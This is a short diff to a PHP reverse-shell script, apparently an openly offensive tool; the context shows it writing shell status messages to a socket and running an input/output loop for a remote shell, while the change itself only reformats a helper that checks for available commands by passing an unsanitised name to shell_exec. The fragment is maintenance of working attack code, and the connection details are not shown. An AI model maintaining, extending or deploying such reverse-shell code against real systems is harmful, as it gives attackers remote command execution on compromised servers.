@@ -89,6 +89,8 @@
         fwrite($socket, "[-] UNABLE TO STABILIZE SHELL\n[-] TTY FUNCTIONALITY IS NOT AVAILABLE\n");
     }
 
+
+
     // now we've got a reverse shell.
     // handle io:
     while (TRUE) 
@@ -145,9 +147,17 @@
     proc_close($process);
 
 
+    //check if a command is runnable on the system
     function cmdExists ($cmd)
     {
-        return !empty(shell_exec("which $cmd"));
+        // attempt to execute, if returns false 
+        // we know we can't run that command
+        if ( !shell_exec("which $cmd") )
+        {
+            return false;
+        }
+
+        return true;
     }
 
 ?>
